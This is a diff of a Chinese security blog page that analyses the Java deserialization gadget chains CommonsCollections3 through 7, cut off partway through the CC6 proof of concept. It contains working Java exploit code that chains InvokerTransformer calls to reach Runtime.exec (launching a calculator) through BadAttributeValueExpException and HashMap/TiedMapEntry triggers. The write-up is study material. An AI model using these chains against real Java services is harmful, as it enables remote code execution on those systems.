@@ -2,16 +2,16 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Java反序列化-CommonsCollections3-5分析 | 六月的雨</title>
+  <title>Java反序列化-CommonsCollections3-7分析 | 六月的雨</title>
   <meta name="keywords" content=" Hexo , Markdown ">
-  <meta name="description" content="Java反序列化-CommonsCollections3-5分析 | 六月的雨">
+  <meta name="description" content="Java反序列化-CommonsCollections3-7分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
+<meta name="description" content="Java反序列化CommonsCollections2分析分析前说几句学习心得，我个人感觉学习各种利用链， 第一，能够让你清晰了解到反序列化漏洞的原理、利用方式、漏洞危害怎么进行触发。 第二，认识哪些JAVA常见的可以被人利用并产生危害的类。 第三，POC的编写细节，再看别人的POC的时候，不是一味的照抄，而是每一句代码都要问自己，为什么要这么写，这样你才能够锻炼自己，如果没有POC的情况下，能够">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java反序列化-CommonsCollections2分析">
 <meta property="og:url" content="http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
+<meta property="og:description" content="Java反序列化CommonsCollections2分析分析前说几句学习心得，我个人感觉学习各种利用链， 第一，能够让你清晰了解到反序列化漏洞的原理、利用方式、漏洞危害怎么进行触发。 第二，认识哪些JAVA常见的可以被人利用并产生危害的类。 第三，POC的编写细节，再看别人的POC的时候，不是一味的照抄，而是每一句代码都要问自己，为什么要这么写，这样你才能够锻炼自己，如果没有POC的情况下，能够">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211209225905013.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208142627069.png">
@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211209224654292.png">
 <meta property="article:published_time" content="2021-12-06T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-09T14:59:17.230Z">
+<meta property="article:modified_time" content="2021-12-13T09:51:21.886Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
@@ -261,7 +261,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(25)</small>
+                <small>(21)</small>
             
         </div>
     </li>
@@ -328,7 +328,7 @@
                     <div data-rel="JAVA代码审计">
                         
                         JAVA代码审计
-                        <small>(13)</small>
+                        <small>(9)</small>
                         
                     </div>
                     
@@ -342,7 +342,7 @@
                     <div data-rel="Java反序列化">
                         
                         Java反序列化
-                        <small>(3)</small>
+                        <small>(2)</small>
                         
                     </div>
                     
@@ -384,8 +384,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="25">
-<input type="hidden" id="yelog_site_word_count" value="34.8k">
+<input type="hidden" id="yelog_site_posts_number" value="21">
+<input type="hidden" id="yelog_site_word_count" value="36.6k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -457,7 +457,7 @@
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title="Java反序列化-CommonsCollections3-5分析">Java反序列化-CommonsCollections3-5分析</span>
+            <span class="post-title" title="Java反序列化-CommonsCollections3-7分析">Java反序列化-CommonsCollections3-7分析</span>
             <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
         </a>
         
@@ -469,12 +469,12 @@
             <span class="post-date" title="2021-12-04 14:12:12">2021/12/04</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All "
            href="/2021/12/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90/"
-           data-tag="Hexo,Markdown"
+           data-tag=""
            data-author="" >
-            <span class="post-title" title="Java反序列化-CommonsCollections1分析">Java反序列化-CommonsCollections1分析</span>
-            <span class="post-date" title="2021-12-01 15:38:12">2021/12/01</span>
+            <span class="post-title" title=""></span>
+            <span class="post-date" title="2021-12-01 15:37:18">2021/12/01</span>
         </a>
         
         <a  class="All 应用安全 "
@@ -550,26 +550,18 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/08/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JDBC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-JDBC核心技术.">java代码审计-JDBC核心技术.</span>
-            <span class="post-date" title="2021-08-07 20:16:12">2021/08/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/07/09/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%E9%9B%86%E5%90%88/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-集合">java代码审计-集合</span>
-            <span class="post-date" title="2021-07-09 20:20:22">2021/07/09</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-IDEA%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"
            data-tag="Hexo,Markdown"
            data-author="" >
             <span class="post-title" title="java代码审计-IDEA常用快捷键">java代码审计-IDEA常用快捷键</span>
+            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
+        </a>
+        
+        <a  class="All java代码审计 "
+           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Apache-Log4j/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="java代码审计-Apache-Log4j">java代码审计-Apache-Log4j</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -585,23 +577,7 @@
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/"
            data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title="java代码审计-注解">java代码审计-注解</span>
-            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-注解">java代码审计-注解</span>
-            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
-        </a>
-        
-        <a  class="All java代码审计 "
-           href="/2021/07/07/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-APP%E6%B5%8B%E8%AF%95%20-%20%E5%89%AF%E6%9C%AC/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-Apache-Log4j">java代码审计-Apache-Log4j</span>
+            <span class="post-title" title="java代码审计-编程语法">java代码审计-编程语法</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -637,14 +613,6 @@
             <span class="post-date" title="2021-06-28 15:16:12">2021/06/28</span>
         </a>
         
-        <a  class="All JAVA代码审计 "
-           href="/2021/06/26/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%B8%B8%E7%94%A8%E7%B1%BB%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4API/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-常用类日期时间API">java代码审计-常用类日期时间API</span>
-            <span class="post-date" title="2021-06-26 15:16:12">2021/06/26</span>
-        </a>
-        
         <div id="no-item-tips">
 
         </div>
@@ -665,7 +633,7 @@
     <div class="pjax">
         <article id="post-Java反序列化-CommonsCollections3分析" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Java反序列化-CommonsCollections3-5分析</h1>
+        <h1 class="article-title">Java反序列化-CommonsCollections3-7分析</h1>
     
     <div class="article-meta">
         
@@ -692,12 +660,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-12 20:36:43'>2021-12-06 22:00</time>
+            Created At : <time class="date" title='Updated At: 2021-12-19 09:46:19'>2021-12-06 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.2k</span>
+        <span>Count:5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -727,7 +695,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections3-5%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections3-5分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x02 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections4%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections4分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-1"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x03 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections5%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections5分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE-2"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-2"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-text">0x02 利用链分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections3%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections3分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x03 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections4%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections4分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-1"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-text">0x03 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections5%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections5分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE-2"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-2"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A-2"><span class="toc-text">0x03 利用链分析：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections6%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections6分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A"><span class="toc-text">0x01利用链：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-HashMap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x02 HashMap利用链分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-HashSet%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x03 HashSet利用链分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x04 疑问解答记录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections7%E5%88%86%E6%9E%90"><span class="toc-text">CommonsCollections7分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A-1"><span class="toc-text">0x01利用链：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-POC%EF%BC%9A-3"><span class="toc-text">0x02 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x03 疑问解答记录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E7%9B%B8%E5%85%B3"><span class="toc-text">版本相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -743,7 +711,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Java反序列化CommonsCollections3-5分析"><a href="#Java反序列化CommonsCollections3-5分析" class="headerlink" title="Java反序列化CommonsCollections3-5分析"></a>Java反序列化CommonsCollections3-5分析</h1><p>版本要求：</p>
+        <h1 id="Java反序列化CommonsCollections3分析"><a href="#Java反序列化CommonsCollections3分析" class="headerlink" title="Java反序列化CommonsCollections3分析"></a>Java反序列化CommonsCollections3分析</h1><p>版本要求：</p>
 <ul>
 <li>jdk1.7</li>
 <li>Commons Collections 3.1</li>
@@ -850,7 +818,7 @@ public class cc3Test &#123;
 
 &#125;
 </code></pre>
-<h2 id="0x02-利用链分析："><a href="#0x02-利用链分析：" class="headerlink" title="0x02 利用链分析："></a>0x02 利用链分析：</h2><p>从上面的利用链和POC，我们可以看出，CC3其实就是CC1+CC2组合，然后修改了中间，CC3利用 TrAXFilter#TrAXFilter()来调用TemplatesImpl.newTransformer()，而CC2中是利用InvokerTransformer利用反射调用newTransformer。</p>
+<h2 id="0x03-利用链分析："><a href="#0x03-利用链分析：" class="headerlink" title="0x03 利用链分析："></a>0x03 利用链分析：</h2><p>从上面的利用链和POC，我们可以看出，CC3其实就是CC1+CC2组合，然后修改了中间，CC3利用 TrAXFilter#TrAXFilter()来调用TemplatesImpl.newTransformer()，而CC2中是利用InvokerTransformer利用反射调用newTransformer。</p>
 <p>所以先学完CC1和CC2，再来看CC3就会很简单了。</p>
 <pre><code>CC1链前半条
 ObjectInputStream.readObject()
@@ -982,7 +950,8 @@ public class cc4 &#123;
     &#125;
 &#125;
 </code></pre>
-<h2 id="0x03-利用链分析："><a href="#0x03-利用链分析：" class="headerlink" title="0x03 利用链分析："></a>0x03 利用链分析：</h2><h1 id="CommonsCollections5分析"><a href="#CommonsCollections5分析" class="headerlink" title="CommonsCollections5分析"></a>CommonsCollections5分析</h1><p>版本要求：</p>
+<h2 id="0x03-利用链分析：-1"><a href="#0x03-利用链分析：-1" class="headerlink" title="0x03 利用链分析："></a>0x03 利用链分析：</h2><p>CC4就是CC2+CC3杂交的，没什么特别的点，所以就不进行分析了。</p>
+<h1 id="CommonsCollections5分析"><a href="#CommonsCollections5分析" class="headerlink" title="CommonsCollections5分析"></a>CommonsCollections5分析</h1><p>版本要求：</p>
 <ul>
 <li>JDK无要求</li>
 <li>CommonsCollections 3.1 - 3.2.1</li>
@@ -1004,59 +973,39 @@ public class cc4 &#123;
                                 Method.invoke()
                                     Runtime.exec()
 </code></pre>
-<h2 id="0x02-POC：-2"><a href="#0x02-POC：-2" class="headerlink" title="0x02 POC："></a>0x02 POC：</h2><pre><code>import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-
-import javax.management.BadAttributeValueExpException;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.*;
-import java.util.HashMap;
-import java.util.Map;
-
-public class cc5 &#123;
-    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
-
-        //反序列化利用链
+<h2 id="0x02-POC：-2"><a href="#0x02-POC：-2" class="headerlink" title="0x02 POC："></a>0x02 POC：</h2><pre><code>public class cc5 &#123;
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
         ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
-                new ConstantTransformer(Runtime.class), // 返回 java.lang.Runtime,但我们知道Runtime.class经过getClass()，之后返回的只会是java.lang.Class
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),  //利用Runtime.class中的getMethod 获取getRuntime，这样我们就能得到一个Runtime实例
-                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),      // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
-                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);//MAC&quot;calc&quot;换成&quot;open -a Calculator&quot;  // 调用返回实例中的exec
-
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                        String.class, Class[].class &#125;, new Object[] &#123;
+                        &quot;getRuntime&quot;, new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                        Object.class, Object[].class &#125;, new Object[] &#123;
+                        null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
         HashMap innermap = new HashMap();
-        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;); //创建LazyMap的Class
-        Constructor[] constructors = clazz.getDeclaredConstructors();    //调用LazyMap的空参构造器
-        Constructor constructor = constructors[0];
-        constructor.setAccessible(true);
-        Map map = (Map)constructor.newInstance(innermap,chain);            //使用构造器创建对象，传入数组，和调用链，这里触发调用链的RCE
-
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 123);
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
+        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
         BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
         Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
         val.setAccessible(true);
-        val.set(poc,tiedMapEntry);
+        val.set(poc,tiedmap);
 
         try&#123;
             ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc5&quot;));
-            outputStream.writeObject(poc);//序列化handle到cc1文件中
+            outputStream.writeObject(poc);
             outputStream.close();
-
             ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc5&quot;));
-            inputStream.readObject(); //恢复对象，反序列化使用readObject获取对象，这里调用了AnnotationInvocationHandler被重写的readObject
+            inputStream.readObject();
         &#125;catch(Exception e)&#123;
             e.printStackTrace();
         &#125;
-
     &#125;
 &#125;
 </code></pre>
-<h2 id="0x02-利用链分析：-1"><a href="#0x02-利用链分析：-1" class="headerlink" title="0x02 利用链分析："></a>0x02 利用链分析：</h2><p>我在CC1中提到：</p>
+<h2 id="0x03-利用链分析：-2"><a href="#0x03-利用链分析：-2" class="headerlink" title="0x03 利用链分析："></a>0x03 利用链分析：</h2><p>我在CC1中提到：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210161612604.png" alt="image-20211210161612604"></p>
 <p>而CC1中是使用AnnotationInvocationHandler，所以我们这里的思路是要找到能调用LazyMap#get方法，并且能使用ReadObject重写当作入口的一个类。</p>
 <p>找到了tiedMapEntry#toString：</p>
@@ -1070,10 +1019,370 @@ public class cc5 &#123;
 <pre><code>private Object val;
 </code></pre>
 <p>valObj是从Filed中取出来的，那么利用方式也就很清晰了，通过反射来设置BadAttributeValueExpException中val的值为TiedMapEntry即可触发命令执行。</p>
+<h1 id="CommonsCollections6分析"><a href="#CommonsCollections6分析" class="headerlink" title="CommonsCollections6分析"></a>CommonsCollections6分析</h1><p>版本要求：</p>
+<ul>
+<li>JDK无要求</li>
+<li>CommonsCollections 3.1 - 3.2.1</li>
+</ul>
+<h2 id="0x01利用链："><a href="#0x01利用链：" class="headerlink" title="0x01利用链："></a>0x01利用链：</h2><pre><code>ava.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash() 
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()  map key
+                        org.apache.commons.collections.map.LazyMap.get()
+                            org.apache.commons.collections.functors.ChainedTransformer.transform()
+                            ...
+                            org.apache.commons.collections.functors.InvokerTransformer.transform()
+                            java.lang.reflect.Method.invoke()
+                                java.lang.Runtime.exec()
+</code></pre>
+<h2 id="0x02-HashMap利用链分析："><a href="#0x02-HashMap利用链分析：" class="headerlink" title="0x02 HashMap利用链分析："></a>0x02 HashMap利用链分析：</h2><p>在cc5，通过对TiedMapEntry#toString方法的调用，触发了TiedMapEntry#getValue，从而触发了LazyMap#get完成后半段的调用。</p>
+<p>而在cc6中则是通过TiedMapEntry#hashCode触发对TiedMapEntry#getValue的调用：</p>
+<p>TiedMapEntry#hashCode</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214164959890.png" alt="image-20211214164959890"></p>
+<p>我们可以试着写POC：</p>
+<pre><code>public class cc6Poc &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;,
+                        new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,
+                        new Object[]&#123;&quot;calc&quot;&#125;),
+                new ConstantTransformer(1), // 隐藏错误信息
+        &#125;;
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, &quot;yhy&quot;);
+        tiedMapEntry.hashCode();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211215092733011.png" alt="image-20211215092733011"></p>
+<p>这里能弹计算器是我们直接调用了tiedMapEntry.hashCode，所以我们需要找到哪里能够调用TiedMapEntry#hashCode的</p>
+<p>HashMap#hash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214170437058.png" alt="image-20211214170437058"></p>
+<p>key参数不可控，所以我们找到哪里调用HashMap#hash</p>
+<p>HashMap#put</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211215092944363.png" alt="image-20211215092944363"></p>
+<p> hash(key)，会去调用key的hashCode，而这里的HashMap#put，我们可以直接调用。</p>
+<p>继续完善POC：</p>
+<pre><code>public class cc6Poc &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+            Transformer[] transformers = new Transformer[]&#123;
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,
+                            new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;,
+                            new Object[]&#123;null, null&#125;),
+                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,
+                            new Object[]&#123;&quot;calc&quot;&#125;),
+                    new ConstantTransformer(1), // 隐藏错误信息
+            &#125;;
+   
+            Transformer transformerChain = new ChainedTransformer(transformers);
+
+            Map innerMap = new HashMap();
+            //使用 LazyMap
+            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+            TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, &quot;yhy&quot;);
+            tiedMapEntry.hashCode();
+
+            HashMap hashMap = new HashMap();
+            hashMap.put(tiedMapEntry, &quot;123&quot;);
+
+            // 序列化
+            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+            oos.writeObject(hashMap);
+
+            // 反序列化读取 out.bin 文件
+            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
+            ois.readObject();
+
+
+    &#125;
+&#125;
+</code></pre>
+<p>这里有两个要注意的点：</p>
+<p>第一：在本地进行序列化的时候，会执行hashMap.put(tiedMapEntry, “123”)，跟进put方法，key是tiedMapEntry，所以会调用tiedMapEntry.hashCode-&gt;&gt;tiedMapEntry.getValue-&gt;&gt;LazyMap.get</p>
+<p>hashMap#put</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211215104703084.png" alt="image-20211215104703084"></p>
+<p>LazyMap#get</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211215104842298.png" alt="image-20211215104842298"></p>
+<p>map中的containsKey（key）方法是判断该key在map中是否有key存在。如果存在则返回true。如果不存在则返回false。</p>
+<p>而，这里的key是在new TiedMapEntry对象的时候，传进去的,key存在,所以返回true</p>
+<pre><code>TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, &quot;yhy&quot;);
+</code></pre>
+<p>最终的POC：</p>
+<pre><code>public class cc6 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        // 人畜无害的Transformer数组
+        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;
+        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
